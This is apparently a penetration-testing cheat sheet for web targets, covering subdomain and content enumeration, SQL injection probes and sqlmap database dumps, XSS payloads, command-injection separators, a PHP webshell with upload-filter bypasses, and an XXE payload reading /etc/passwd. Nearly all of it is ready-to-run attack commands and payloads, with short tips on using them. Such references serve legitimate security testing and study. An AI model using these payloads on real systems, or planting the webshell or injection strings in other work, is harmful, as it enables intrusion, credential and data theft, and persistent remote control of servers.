# Web Enumeration & Exploitation Reference

Practical reference for web-focused recon and common vulnerability classes — subdomain/content discovery through to manual injection testing.

## Table of Contents

1. [Subdomain & Asset Discovery](#1-subdomain--asset-discovery)
2. [Content Discovery](#2-content-discovery)
3. [SQL Injection](#3-sql-injection)
4. [XSS](#4-xss)
5. [Command Injection](#5-command-injection)
6. [File Upload Bypasses](#6-file-upload-bypasses)
7. [XXE and IDOR](#7-xxe-and-idor)
8. [Field Notes](#8-field-notes)

---

## 1. Subdomain & Asset Discovery

```
assetfinder --subs-only target.com | tee subdomains.txt
amass enum -d target.com | tee -a subdomains.txt
cat subdomains.txt | httprobe | tee alive.txt          # confirm which resolve to a live web server
gowitness file -f alive.txt -P ./screenshots            # screenshot everything alive for fast visual triage
```

## 2. Content Discovery

```
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
nikto -h http://target.com                              # quick known-vuln/misconfig scan
whatweb http://target.com                                # technology fingerprinting
```

`ffuf` is generally faster and more flexible (JSON output, easy filtering by response size/code) — `gobuster` is the more common default in walkthroughs but either does the same core job.

## 3. SQL Injection

Manual probes worth trying before reaching for a tool:

```
' OR 1=1--
admin'--
' ORDER BY 1--                    # binary-search the column count
' UNION SELECT NULL,NULL--        # match column count, then swap NULLs for real column guesses
' UNION SELECT username,password FROM users--
```

Automated:

```
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
sqlmap -r request.txt --dbs        # feed it a raw captured HTTP request instead of a URL
```

## 4. XSS

```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

Try all three — filters that block `<script>` tags often miss event-handler-based payloads like `onerror`/`onload`.

## 5. Command Injection

```
; id
&& whoami
| id
`whoami`
$(whoami)
```

Try each separator — which one works depends on the underlying shell and how the vulnerable code concatenates input.

## 6. File Upload Bypasses

```
# Basic PHP webshell
<?php system($_GET['cmd']); ?>

# Extension/content-type filter bypasses worth trying:
shell.php5
shell.phtml
shell.jpg.php
# prepend GIF89a; to the file content to pass basic magic-byte checks
```

## 7. XXE and IDOR

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

IDOR is simpler to test than to automate — just increment/change an ID and see what comes back:

```
/profile?id=123  →  /profile?id=124
```

## 8. Field Notes

**Screenshot everything before you dig in.** Running `gowitness` (or similar) against every live host found during subdomain discovery turns a wall of URLs into a fast visual triage pass — obviously-interesting targets (login portals, admin panels, unusual apps) jump out immediately instead of requiring you to open each one manually.

**Manual SQLi probes first, `sqlmap` second.** A quick `' OR 1=1--` confirms the injection point exists and gives you a feel for the query structure before handing it to `sqlmap` — running `sqlmap` blind against every parameter is slow and noisy, and you'll have a much better sense of what to expect from it if you've already confirmed injection manually.
